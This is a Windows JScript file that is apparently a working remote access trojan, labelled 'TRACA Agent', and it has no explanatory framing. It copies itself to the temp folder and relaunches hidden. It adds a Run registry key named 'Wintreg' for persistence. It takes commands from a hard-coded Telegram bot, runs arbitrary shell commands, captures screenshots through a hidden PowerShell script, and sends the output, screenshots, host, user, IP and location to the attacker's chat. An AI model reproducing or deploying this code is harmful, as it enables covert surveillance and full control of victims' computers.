var shell = WScript.CreateObject('WScript.Shell');
var fso = WScript.CreateObject('Scripting.FileSystemObject');
var tempPath=shell.ExpandEnvironmentStrings("%TEMP%")+"\\bot.js";if(fso.GetAbsolutePathName(WScript.ScriptFullName).toLowerCase()!==tempPath.toLowerCase()){fso.CopyFile(WScript.ScriptFullName,tempPath,true);shell.Run('wscript "'+tempPath+'"',0,false);WScript.Quit();}var TOKEN='7793542872:AAGLIUMGi7K4J9SbcmSwIKzj7DaZiKLwRlk',CHAT_ID='6231354707',POLL_INTERVAL=5000,HEARTBEAT_INTERVAL=60000,MAX_RETRIES=3,RETRY_DELAY=3000;
var http = null;

var lastUpdateId = 0;
var lastHeartbeat = 0;
var selectedId = null; // 4-digit ID or null for broadcast
var computerId = generateComputerId();
var startTime = new Date().getTime();
var SCREENSHOT_PATH = fso.GetSpecialFolder(2) + "\\screenshot.png";

// Generate 4-digit ID
function generateComputerId() {
    var id = Math.floor(Math.random() * 9000) + 1000; // 1000-9999
    return id.toString();
}

// Persistence
function ensurePersistence() {
    try {
        var regKey = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Wintreg";
        var command = 'wscript.exe "' + WScript.ScriptFullName + '"';
        shell.RegWrite(regKey, command, "REG_SZ");
        writeLog('Persistence set.');
    } catch (e) {
        writeLog('Persistence failed: ' + e.message);
    }
}

function formatDate(d) {
    var year = d.getFullYear();
    var month = d.getMonth() + 1;
    var day = d.getDate();
    var hour = d.getHours();
    var minute = d.getMinutes();
    var second = d.getSeconds();
    if (month < 10) month = '0' + month;
    if (day < 10) day = '0' + day;
    if (hour < 10) hour = '0' + hour;
    if (minute < 10) minute = '0' + minute;
    if (second < 10) second = '0' + second;
    return year + '-' + month + '-' + day + ' ' + hour + ':' + minute + ':' + second;
}

function safeTrim(text) {
    return String(text).replace(/^\s+|\s+$/g, '');
}

function escapeHtml(text) {
    return String(text)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

function parseJson(text) {
    if (typeof JSON !== 'undefined' && JSON.parse) {
        return JSON.parse(text);
    }
    return eval('(' + text + ')');
}

function stringifyJson(value) {
    if (typeof JSON !== 'undefined' && JSON.stringify) {
        return JSON.stringify(value);
    }
    var result = [];
    if (value === null) {
        return 'null';
    }
    if (typeof value === 'string') {
        return '"' + value.replace(/\\"/g, '\\\"') + '"';
    }
    if (typeof value === 'number' || typeof value === 'boolean') {
        return String(value);
    }
    if (value instanceof Array) {
        for (var i = 0; i < value.length; i++) {
            result.push(stringifyJson(value[i]));
        }
        return '[' + result.join(',') + ']';
    }
    for (var key in value) {
        if (value.hasOwnProperty(key)) {
            result.push(stringifyJson(key) + ':' + stringifyJson(value[key]));
        }
    }
    return '{' + result.join(',') + '}';
}

function writeLog(message) {
    try {
        var file = fso.OpenTextFile(LOG_PATH, 8, true);
        file.WriteLine('[' + formatDate(new Date()) + '] ' + message);
        file.Close();
    } catch (e) {
        // Silent fail
    }
}

function httpRequest(method, url, data) {
    var http = null;
    try {
        http = new ActiveXObject('MSXML2.ServerXMLHTTP.6.0');
    } catch (e) {
        try {
            http = new ActiveXObject('MSXML2.XMLHTTP');
        } catch (e) {
            try {
                http = new ActiveXObject('Microsoft.XMLHTTP');
            } catch (e) {
                writeLog('HTTP object unavailable: ' + e.message);
                return null;
            }
        }
    }
    var attempt = 0;
    while (attempt < MAX_RETRIES) {
        try {
            http.open(method, url, false);
            if (method === 'POST') {
                http.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            }
            http.send(data || null);
            if (http.status === 200) {
                return http.responseText;
            }
            writeLog('HTTP ' + method + ' failed ' + http.status + ' for ' + url);
        } catch (e) {
            writeLog('HTTP request failed attempt ' + (attempt + 1) + ': ' + e.message);
        }
        WScript.Sleep(RETRY_DELAY);
        attempt++;
    }
    writeLog('HTTP request failed after ' + MAX_RETRIES + ' attempts for ' + url);
    return null;
}

function getIdentity() {
    return computerId + ' ' + getPCName() + ' ' + shell.ExpandEnvironmentStrings('%USERNAME%');
}

function sendTelegramMessage(text, replyMarkup) {
    var url = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage';
    var payload = 'chat_id=' + encodeURIComponent(CHAT_ID) + '&text=' + encodeURIComponent(text);
    if (replyMarkup) {
        payload += '&reply_markup=' + encodeURIComponent(stringifyJson(replyMarkup));
    }
    return httpRequest('POST', url, payload);
}

function sendPhoto(filePath) {
    try {
        if (!fso.FileExists(filePath)) {
            writeLog('Photo file does not exist: ' + filePath);
            return;
        }
        var boundary = '----Boundary' + new Date().getTime();
        var body = '--' + boundary + '\r\n' +
            'Content-Disposition: form-data; name="chat_id"\r\n\r\n' + CHAT_ID + '\r\n' +
            '--' + boundary + '\r\n' +
            'Content-Disposition: form-data; name="photo"; filename="screenshot.png"\r\n' +
            'Content-Type: image/png\r\n\r\n';
        var stream = new ActiveXObject('ADODB.Stream');
        stream.Type = 1; // binary
        stream.Open();
        stream.LoadFromFile(filePath);
        var fileData = stream.Read();
        stream.Close();
        var endBoundary = '\r\n--' + boundary + '--\r\n';
        var fullStream = new ActiveXObject('ADODB.Stream');
        fullStream.Type = 1;
        fullStream.Open();
        var bodyStream = new ActiveXObject('ADODB.Stream');
        bodyStream.Type = 2; // text
        bodyStream.Charset = 'utf-8';
        bodyStream.Open();
        bodyStream.WriteText(body);
        bodyStream.Position = 0;
        bodyStream.CopyTo(fullStream);
        bodyStream.Close();
        fullStream.Write(fileData);
        var endStream = new ActiveXObject('ADODB.Stream');
        endStream.Type = 2;
        endStream.Charset = 'utf-8';
        endStream.Open();
        endStream.WriteText(endBoundary);
        endStream.Position = 0;
        endStream.CopyTo(fullStream);
        endStream.Close();
        fullStream.Position = 0;
        var url = 'https://api.telegram.org/bot' + TOKEN + '/sendPhoto';
        var http = new ActiveXObject('MSXML2.XMLHTTP');
        http.open('POST', url, false);
        http.setRequestHeader('Content-Type', 'multipart/form-data; boundary=' + boundary);
        http.send(fullStream.Read());
        fullStream.Close();
        if (http.status == 200) {
            writeLog('Photo sent successfully');
        } else {
            writeLog('Photo send failed: ' + http.status + ' ' + http.responseText);
        }
    } catch (e) {
        writeLog('Error sending photo: ' + e.message);
    }
}

function getUpdates(offset) {
    var url = 'https://api.telegram.org/bot' + TOKEN + '/getUpdates';
    if (offset) {
        url += '?offset=' + offset;
    }
    return httpRequest('GET', url);
}

function getSystemInfo() {
    var info = 'System Information\n';
    info += 'Host: ' + getPCName() + '\n';
    info += 'User: ' + shell.ExpandEnvironmentStrings('%USERNAME%') + '\n';
    info += 'OS: ' + getOS() + '\n';
    info += 'Temp: ' + TEMP + '\n';
    info += 'Selected ID: ' + (selectedId || 'None (broadcast)') + '\n';
    info += 'Uptime: ' + Math.floor((new Date().getTime() - startTime) / 60000) + ' min';
    return info;
}

function getOS() {
    try {
        var exec = shell.Exec('cmd /c ver');
        var output = '';
        while (!exec.StdOut.AtEndOfStream) {
            output += exec.StdOut.ReadAll();
        }
        var lines = output.split('\n');
        for (var i = 0; i < lines.length; i++) {
            var line = safeTrim(lines[i]);
            if (line.indexOf('Microsoft Windows') !== -1) {
                var version = line.match(/\[Version (\d+\.\d+\.\d+)/);
                if (version) {
                    var build = parseInt(version[1].split('.')[2]);
                    if (build >= 22000) {
                        return 'Win 11';
                    } else {
                        return 'Win 10';
                    }
                }
                return 'Windows';
            }
        }
        return 'Unknown';
    } catch (e) {
        return 'Unknown';
    }
}

function getPCName(){try{return GetWmiProperty("Win32_ComputerSystem","Name");}catch(e){return shell.ExpandEnvironmentStrings('%COMPUTERNAME%')||'Unknown';}}

function getOnlineList(){return computerId+' '+getPCName()+' '+shell.ExpandEnvironmentStrings('%USERNAME%')+' '+getIP()+' '+getCountry()+' Connected';}

function getIP(){try{var r=httpRequest('GET','https://api.geoapify.com/v1/ipinfo?&apiKey=a0aabda5d96c4a899caae5368a73e3e1');if(r){var d=parseJson(r);if(d&&d.ip)return d.ip;}}catch(e){}return'Unknown';}

function getCountry(){try{var r=httpRequest('GET','https://api.geoapify.com/v1/ipinfo?&apiKey=a0aabda5d96c4a899caae5368a73e3e1');if(r){var d=parseJson(r);if(d&&d.country&&d.country.name)return d.country.name;}}catch(e){}return'Unknown';}

function captureScreenshot() {
    try {
        var path = SCREENSHOT_PATH;
        writeLog('Attempting screenshot to: ' + path);
        var psFile = fso.GetSpecialFolder(2) + '\\temp_screenshot.ps1';
        var psContent = 'Add-Type -AssemblyName System.Windows.Forms\n' +
                        'Add-Type -AssemblyName System.Drawing\n' +
                        'Add-Type -TypeDefinition @"\n' +
                        'using System;\n' +
                        'using System.Runtime.InteropServices;\n' +
                        'using System.Drawing;\n' +
                        'using System.Drawing.Imaging;\n' +
                        'using System.Windows.Forms;\n' +
                        'public class ScreenCapturePInvoke {\n' +
                        '    [DllImport("user32.dll")] public static extern IntPtr GetDesktopWindow();\n' +
                        '    [DllImport("user32.dll")] public static extern IntPtr GetWindowDC(IntPtr hWnd);\n' +
                        '    [DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleDC(IntPtr hDC);\n' +
                        '    [DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int nWidth, int nHeight);\n' +
                        '    [DllImport("gdi32.dll")] public static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObject);\n' +
                        '    [DllImport("gdi32.dll")] [return: MarshalAs(UnmanagedType.Bool)] public static extern bool BitBlt(IntPtr hDestDC, int x, int y, int nWidth, int nHeight, IntPtr hSrcDC, int xSrc, int ySrc, TernaryRasterOperations dwRop);\n' +
                        '    [DllImport("gdi32.dll")] [return: MarshalAs(UnmanagedType.Bool)] public static extern bool DeleteDC(IntPtr hDC);\n' +
                        '    [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);\n' +
                        '    [DllImport("gdi32.dll")] [return: MarshalAs(UnmanagedType.Bool)] public static extern bool DeleteObject(IntPtr hObject);\n' +
                        '    public enum TernaryRasterOperations : uint { SRCCOPY = 0x00CC0020 }\n' +
                        '    public static Bitmap CaptureScreen(int x, int y, int width, int height) {\n' +
                        '        IntPtr desktopWindowHandle = GetDesktopWindow();\n' +
                        '        IntPtr desktopDC = GetWindowDC(desktopWindowHandle);\n' +
                        '        IntPtr memoryDC = CreateCompatibleDC(desktopDC);\n' +
                        '        IntPtr bitmapHandle = CreateCompatibleBitmap(desktopDC, width, height);\n' +
                        '        IntPtr oldBitmapHandle = SelectObject(memoryDC, bitmapHandle);\n' +
                        '        try {\n' +
                        '            bool success = BitBlt(memoryDC, 0, 0, width, height, desktopDC, x, y, TernaryRasterOperations.SRCCOPY);\n' +
                        '            if (!success) { return null; }\n' +
                        '            return Bitmap.FromHbitmap(bitmapHandle);\n' +
                        '        } finally {\n' +
                        '            SelectObject(memoryDC, oldBitmapHandle);\n' +
                        '            DeleteObject(bitmapHandle);\n' +
                        '            DeleteDC(memoryDC);\n' +
                        '            ReleaseDC(desktopWindowHandle, desktopDC);\n' +
                        '        }\n' +
                        '    }\n' +
                        '}\n' +
                        '"@ -ReferencedAssemblies "System.Drawing.dll", "System.Windows.Forms.dll"\n' +
                        'Add-Type -TypeDefinition @"\n' +
                        'using System;\n' +
                        'using System.Runtime.InteropServices;\n' +
                        'public class DPIAwarenessForScreenshots {\n' +
                        '    [DllImport("user32.dll", SetLastError = true)]\n' +
                        '    [return: MarshalAs(UnmanagedType.Bool)]\n' +
                        '    public static extern bool SetProcessDPIAware();\n' +
                        '}\n' +
                        '"@\n' +
                        '[DPIAwarenessForScreenshots]::SetProcessDPIAware() | Out-Null\n' +
                        '$s=[System.Windows.Forms.SystemInformation]::VirtualScreen\n' +
                        '$bmp=[ScreenCapturePInvoke]::CaptureScreen($s.Left,$s.Top,$s.Width,$s.Height)\n' +
                        'if ($bmp) { $bmp.Save("' + path.replace(/\\/g, '\\\\') + '"); $bmp.Dispose() }\n';
        var f = fso.CreateTextFile(psFile, true);
        f.Write(psContent);
        f.Close();
        writeLog('PS file created: ' + psFile);
        shell.Run('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + psFile + '"', 0, true);
        writeLog('PS file executed');
        // Delete the temp file
        if (fso.FileExists(psFile)) {
            fso.DeleteFile(psFile);
            writeLog('PS file deleted');
        }
        if (fso.FileExists(path)) {
            writeLog('Screenshot file exists, sending photo');
            sendPhoto(path);
            return 'Screenshot sent.';
        }
        writeLog('Screenshot file does not exist');
        return 'Screenshot capture failed.';
    } catch (e) {
        writeLog('Screenshot error: ' + e.message);
        return 'Screenshot error: ' + e.message;
    }
}

function handleCommand(messageText) {
    var command = safeTrim(String(messageText).toLowerCase());
    if (!command) {
        writeLog('Empty command received');
        return;
    }
    writeLog('Processing command: ' + command);

    try {
        if (command === '/start') {
            sendTelegramMessage(getIdentity() + '\nTRACA Agent Active\nUse /commands to view available commands.');
        } else if (command === '/commands') {
            sendTelegramMessage(getIdentity() + '\n/commands - explain commands\n/select ID - select PC by 4-digit ID\n/unselect - unselect ID\n/online - list online PCs\n/cmd command - execute shell command\n/screenshot - capture screenshot\n/screenshot number - capture multiple screenshots\n/py command - execute Python command');
        } else if (command === '/info') {
            sendTelegramMessage(getIdentity() + '\n' + getSystemInfo());
        } else if (command === '/online') {
            sendTelegramMessage(getOnlineList());
        } else if (command.indexOf('/select ') === 0) {
            var id = safeTrim(messageText.substring(8));
            if (id === computerId) {
                selectedId = id;
                sendTelegramMessage('Target selected: ' + id);
            } else {
                sendTelegramMessage('Invalid ID');
            }
        } else if (command === '/unselect') {
            selectedId = null;
            sendTelegramMessage('Target unselected');
        } else if (command.indexOf('/cmd ') === 0) {
            var cmd = messageText.substring(5);
            var output = runCommand(cmd);
            sendTelegramMessage(getIdentity() + '\nCommand Output:\n' + output);
        } else if (command === '/screenshot') {
            sendTelegramMessage(getIdentity() + '\n' + captureScreenshot());
        } else if (command.indexOf('/screenshot ') === 0) {
            var num = parseInt(messageText.substring(12));
            if (isNaN(num) || num < 1) num = 1;
            for (var i = 0; i < num; i++) {
                sendTelegramMessage(captureScreenshot());
                if (i < num - 1) WScript.Sleep(3000);
            }
        } else if (command.indexOf('/py ') === 0) {
            var pyCmd = messageText.substring(4).replace(/—/g, '-').replace(/^\s*py\s+/i, 'python ');
            var output = runPython(pyCmd);
            sendTelegramMessage(getIdentity() + '\nPython Output:\n' + output);
        } else {
            sendTelegramMessage('Unknown command. Use /commands for commands.');
        }
        writeLog('Command processed successfully');
    } catch (e) {
        writeLog('Error in handleCommand: ' + e.message);
        sendTelegramMessage(getIdentity() + '\nError processing command: ' + e.message);
    }
}

function runCommand(cmd) {
    try {
        var tempFile = fso.GetSpecialFolder(2) + '\\cmd_output.txt';
        shell.Run('cmd /c ' + cmd + ' > "' + tempFile + '" 2>&1', 0, true);
        if (fso.FileExists(tempFile)) {
            var f = fso.OpenTextFile(tempFile, 1);
            var output = f.ReadAll();
            f.Close();
            fso.DeleteFile(tempFile);
            return output || 'No output';
        }
    } catch (e) {
        return 'Error: ' + e.message;
    }
    return 'No output';
}

function runPython(c) {
    try {
        var tempFile = fso.GetSpecialFolder(2) + '\\py_output.txt';
        shell.Run('cmd /c ' + c + ' > "' + tempFile + '" 2>&1', 0, true);
        if (fso.FileExists(tempFile)) {
            var f = fso.OpenTextFile(tempFile, 1);
            var output = f.ReadAll();
            f.Close();
            fso.DeleteFile(tempFile);
            return output || 'No output';
        }
    } catch (e) {
        return 'Python not installed or error: ' + e.message;
    }
    return 'No output';
}

function GetWmiProperty(cls, prop) {
    try {
        var locator = new ActiveXObject('WbemScripting.SWbemLocator');
        var service = locator.ConnectServer('.');
        var items = service.ExecQuery('SELECT ' + prop + ' FROM ' + cls);
        var e = new Enumerator(items);
        if (!e.atEnd()) {
            return String(e.item().Properties_.Item(prop).Value);
        }
    } catch (e) {
    }
    return null;
}

function getOS() {
    try {
        var caption = GetWmiProperty('Win32_OperatingSystem', 'Caption');
        if (caption) {
            return caption;
        }
    } catch (e) {
    }
    return 'Unknown';
}

function processUpdates() {
    try {
        writeLog('Polling for updates...');
        var result = getUpdates(lastUpdateId + 1);
        if (!result) {
            writeLog('No updates received');
            return;
        }
        var data;
        try {
            data = parseJson(result);
        } catch (e) {
            writeLog('JSON parse failed: ' + e.message + ' Response: ' + result.substring(0, 200));
            return;
        }
        if (!data || !data.ok || !data.result) {
            writeLog('Invalid update data: ' + stringifyJson(data));
            return;
        }
        writeLog('Processing ' + data.result.length + ' updates');
        for (var i = 0; i < data.result.length; i++) {
            var update = data.result[i];
            if (update.update_id >= lastUpdateId) {
                lastUpdateId = update.update_id;
            }
            if (update.message && update.message.chat && update.message.chat.id == CHAT_ID && update.message.text) {
                try {
                    writeLog('Handling message: ' + update.message.text);
                    handleCommand(update.message.text);
                    writeLog('Command handled successfully');
                } catch (e) {
                    writeLog('Handle command error: ' + e.message);
                }
            }
            if (update.callback_query && update.callback_query.from && update.callback_query.from.id == CHAT_ID) {
                var callback = update.callback_query.data;
                writeLog('Handling callback: ' + callback);
                if (callback === 'info') {
                    try {
                        handleCommand('/info');
                    } catch (e) {
                        writeLog('Callback info error: ' + e.message);
                    }
                } else if (callback === 'screenshot') {
                    try {
                        handleCommand('/screenshot');
                    } catch (e) {
                        writeLog('Callback screenshot error: ' + e.message);
                    }
                } else if (callback === 'online') {
                    try {
                        handleCommand('/online');
                    } catch (e) {
                        writeLog('Callback online error: ' + e.message);
                    }
                }
            }
        }
    } catch (e) {
        writeLog('Process updates error: ' + e.message);
    }
}

function sendHeartbeat() {
    // No message, just log
    writeLog('Heartbeat');
}

function main() {
    writeLog('TRACA agent starting.');
    ensurePersistence();
    // Skip old messages
    try {
        var initial = getUpdates();
        if (initial) {
            var data = parseJson(initial);
            if (data && data.result && data.result.length > 0) {
                lastUpdateId = data.result[data.result.length - 1].update_id;
            }
        }
    } catch (e) {
        writeLog('Error skipping old messages: ' + e.message);
    }
    sendTelegramMessage(getOnlineList());
    lastHeartbeat = new Date().getTime();

    while (true) {
        try {
            var now = new Date().getTime();
            if (now - lastHeartbeat >= HEARTBEAT_INTERVAL) {
                sendHeartbeat();
                lastHeartbeat = now;
            }
            processUpdates();
            writeLog('Main loop iteration completed');
        } catch (e) {
            writeLog('Main loop error: ' + e.message);
            WScript.Sleep(10000); // Wait longer on error
        }
        WScript.Sleep(POLL_INTERVAL);
    }
}

main();
